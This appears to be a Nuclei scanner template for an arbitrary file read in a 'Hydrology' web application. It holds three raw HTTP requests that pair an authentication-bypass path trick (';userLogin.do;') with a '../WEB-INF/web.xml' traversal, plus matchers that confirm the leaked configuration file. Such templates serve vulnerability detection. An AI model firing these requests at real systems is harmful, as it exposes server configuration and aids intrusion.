id: Hydrology-download-readfile
info:
  name: Hydrology-download-readfile
  author: lemonlove7
  severity: high
flow: http(1) && http(2) && http(3)
http:
  - raw:
      - |-
        GET /generalReport/download.do;userLogin.do;?fileName=../WEB-INF/web.xml HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
        Accept-Encoding: gzip, deflate
        Connection: close
  - raw:
      - |-
        GET /statistic/download.do;userLogin.do;?fileName=../WEB-INF/web.xml HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
        Accept-Encoding: gzip, deflate
        Connection: close
  - raw:
      - |-
        GET /stAlarmInfo/download.do;userLogin.do;?fileName=../WEB-INF/web.xml HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
        Accept-Encoding: gzip, deflate
        Connection: close
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - display-name
          - context-param
    matchers-condition: and
